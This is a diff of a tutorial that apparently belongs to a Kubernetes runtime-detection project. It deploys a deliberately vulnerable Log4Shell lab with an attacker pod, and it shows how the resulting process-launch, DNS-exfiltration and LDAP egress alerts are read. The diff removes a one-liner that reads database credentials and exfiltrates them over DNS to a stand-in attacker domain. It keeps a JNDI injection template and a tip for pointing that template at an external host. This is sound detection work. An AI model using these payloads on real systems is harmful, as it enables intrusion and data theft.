@@ -122,7 +122,9 @@ kubectl -n kube-system rollout restart deploy/coredns
 Bring up the whole chain (`log4j-poc`)[^scenarios], with the pods labelled `user-defined-profile/network` to bind the profiles from step 2. 
 The manifest also includes the in-cluster attacker: a marshalsec LDAP server and a class-file HTTP server.
 
-[^scenarios]: **B** `backend-b.yaml` — `ghcr.io/k8sstormcenter/log4j-chain-backend-contained@sha256:f71e03993fec4df6ea947eda235d072f5c37569491fd32512a6d793369852e35` · **C** `backend-c.yaml` — `ghcr.io/k8sstormcenter/log4j-chain-backend-patched@sha256:cf34e119b720b0a31b5e5d2a7ede0e61eea0c14105c88558d80e7fa2a062290a`
+[^scenarios]: 
+**B** `distroless` — `ghcr.io/k8sstormcenter/log4j-chain-backend-contained@sha256:f71e03993fec4df6ea947eda235d072f5c37569491fd32512a6d793369852e35`   
+**C** `patched` — `ghcr.io/k8sstormcenter/log4j-chain-backend-patched@sha256:cf34e119b720b0a31b5e5d2a7ede0e61eea0c14105c88558d80e7fa2a062290a`
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/k8sstormcenter/bob/main/example/log4j-chain/log4j-chain.yaml
@@ -130,11 +132,11 @@ kubectl -n log4j-poc rollout status deploy/chain-backend --timeout=120s
 kubectl -n attacker-ns rollout status deploy/attacker --timeout=60s
 ```
 
-There are two non-vulnerable images in that registry, so you can contrast the detection. Choose the "vulnerable" one right now:
+There are two non-vulnerable images [^scenarios], so you can contrast the detection, default is the vulnerable:
 
 ```yaml
 # backend container, in log4j-chain.yaml
-image: ghcr.io/k8sstormcenter/log4j-chain-backend-vulnerable@sha256:8f3cb3f9…   # log4j 2.14.1 — JNDI enabled
+image: ghcr.io/k8sstormcenter/log4j-chain-backend-vulnerable@sha256:8f3cb3f9…   # 3 different backend images, this one is fully vulnerable
 ```
 
 ## 5. Fire the exploit
@@ -160,11 +162,11 @@ args: [ curl, -s, -A,
     R0011 (which skips private targets). To see the full DNS + egress detection, run the attacker on
     an external host and point the JNDI at it, e.g.
     `${jndi:ldap://<public-host>:1389/Payload}`. The demo's attacker image takes the codebase host as
-    an env var (`CODEBASE_HOST`), so it can run anywhere.
+    an env var (`CODEBASE_HOST`), so it can run anywhere. AT YOUR OWN RISK
 
 ## 6. See the detection
 
-First, recall what the profile **allows** — the two lists from the gif. Nothing here ever alerts:
+<!-- First, recall what the profile **allows** — the two lists from the gif. Nothing here ever alerts:
 
 ```bash
 kubectl -n log4j-poc get applicationprofile chain-backend \
@@ -176,32 +178,24 @@ kubectl -n log4j-poc get networkneighborhood chain-backend \
   -o jsonpath='{range .spec.containers[0].egress[*]}{.identifier}{"\n"}{end}'
 #  egress-kube-dns   egress-chain-postgres                  # DNS + the database, nothing else
 ```
+ -->
 
-Now fire the payload and read the raw alerts — **one JSON object per rule violation**:
+Read the raw alerts — **one JSON object per rule violation**:
 
 ```bash
 kubectl -n kubescape logs -l app=node-agent --tail=200 | grep '"RuleID":"R' \
   | jq -c '{RuleID, alertName: .BaseRuntimeMetadata.alertName, args: .BaseRuntimeMetadata.arguments}'
 ```
 
-#### R0001 — remote code execution
+#### R0001 — unexpected process log4shell
 
-The alert's process tree is the smoking gun — a **JVM worker thread** spawned a shell:
+The alert's process tree is a very clean detection on what was attempted:
 
 ```
 java  (parent: containerd-shim)
- └─ sh  (parent: pool-2-thread-2)      ← a log4j/HTTP worker thread; a web server never execs a shell
+ └─ sh  (parent: pool-2-thread-2)  # means the shell actually happened    
 ```
 
-and that shell's command line (the alert's `arguments.args`) is the entire attack in one line:
-
-```bash
-sh -c 'ROW=$(psql -h chain-postgres -U postgres -At -c "SELECT current_database()||chr(58)||current_user")
-       ENC=$(printf "%s" "$ROW" | base32 | tr -d "=" | cut -c1-40)
-       getent hosts "${ENC}.exfil.attacker.example.com"'      # read DB → encode → exfil over DNS
-```
-
-Every non-`java` binary that shell runs is outside the profile, so each raises its own R0001:
 
 ```json
 {"RuleID":"R0001","alertName":"Unexpected process launched","exec":"/bin/sh","comm":"sh","pcomm":"pool-2-thread-2"}
@@ -211,8 +205,10 @@ Every non-`java` binary that shell runs is outside the profile, so each raises i
 {"RuleID":"R0001","alertName":"Unexpected process launched","exec":"/usr/bin/getent","comm":"getent","pcomm":"sh"}
 ```
 
-`psql` runs too — it's the payload reading the database — but `psql` **is** in the profile, so it
-does *not* alert. The attacker is abusing a permitted tool; the tell is the shell wrapped around it.
+
+!!! tip "Not every executable in the process tree is actually executed"
+    Careful when reading these alerts, only the uppermost process is the one eBPF saw with exec_cve. It may have further forks (`-c`) but if you dont see
+    those alerting, they may still have failed. Test this yourself with the patched and the distroless image 
 
 #### R0005 — data exfiltration over DNS
 
@@ -223,27 +219,23 @@ does *not* alert. The attacker is abusing a permitted tool; the tell is the shel
  "domain":"OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ.exfil.attacker.example.com.","protocol":"UDP","port":39361}
 ```
 
-Decode the label — `echo OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ | base32 -d` → **`postgres:postgres`** — the
-database identity, smuggled out one DNS query at a time to a domain the profile never allows. That's
-the classic DNS-exfiltration channel, caught because the *domain*, not just the connection, is
-outside the `NetworkNeighborhood`.
+Decode the label — `echo OBXXG5DHOJSXGOTQN5ZXIZ3SMVZQ | base32 -d` → **`postgres:postgres`** 
 
-Two rules, two facets of the same compromise — the RCE (**R0001**) and the credential theft it
-smuggles out over DNS (**R0005**) — reconstructed from kernel events and caught purely by deviation
-from the signed Bill of Behavior. You detected Log4Shell with **no CVE signature and no learning
-period** — purely because the backend did something its Bill of Behavior declares it never does.
 
-The third fingerprint — the outbound LDAP + HTTP call-out (**R0011**) — needs a couple of extra steps
+
+<!-- The third fingerprint — the outbound LDAP + HTTP call-out (**R0011**) — needs a couple of extra steps
 and is covered in [Also see: the egress rule (R0011)](#also-see-the-egress-rule-r0011) below.
 
 ```bash
 kubectl delete ns log4j-poc attacker-ns      # clean up
-```
+``` 
+-->
 
-## Also see: the egress rule (R0011) {#also-see-the-egress-rule-r0011}
 
-R0011 catches the outbound LDAP + HTTP that fetch the exploit class — the network fingerprint of
-Log4Shell. It's not in the turnkey path above for two reasons, both fixable:
+#### R0011 Outbound LDAP {#also-see-the-egress-rule-r0011}
+
+The JNDI string needs to resolve an outbound LDAP + HTTP to fetch the exploit class for
+Log4j 
 
 **1. R0011 ships disabled.** Enable it in the installed rules:
 
@@ -254,9 +246,9 @@ kubectl -n kubescape patch rules.kubescape.io default-rules --type=json \
                  | {op:"replace", path:"/spec/rules/\(.key)/enabled", value:true}]')"
 ```
 
-**2. R0011 skips private targets.** The in-cluster attacker is a ClusterIP (RFC-1918), so R0011 never
-fires against it. Run the attacker on an **external/public** host and point the JNDI there — the demo
-attacker image takes the codebase host as `CODEBASE_HOST`, so it runs anywhere:
+**2. R0011 skips private targets.** The in-cluster attacker is a ClusterIP (RFC-1918), so put the attacker on an **external/public** host
+ and point the JNDI there — the demo
+attacker image has an ENV var `CODEBASE_HOST`, so it runs anywhere:
 
 ```yaml
 # in attack-pod.yaml, the User-Agent JNDI
@@ -276,8 +268,6 @@ TCP, carried by R0011 rather than R0005.
 
 ## Next
 
-- **[End-to-end example](tutorial.md)** — the same chain across three backends (vulnerable /
-  contained / patched), showing how the profile tells a *successful* exploit from a *contained* one.
-- **[What is a Bill of Behavior](index.md)** — the concept, the custom resources, and how wildcards,
-  signing, and compaction let you *ship* a profile instead of learning one.
+- **[What is a Software Bill of Behavior](index.md)** — the concept that lets you *ship* a profile instead of learning one.
 - **[Node Agent Rule Library](../node-agent-rule-library.md)** — the full catalog of detection rules.
+- **[Signing and Tampering](signing-and-tamper.md)** - how to make sure the profiles and rules are safe.
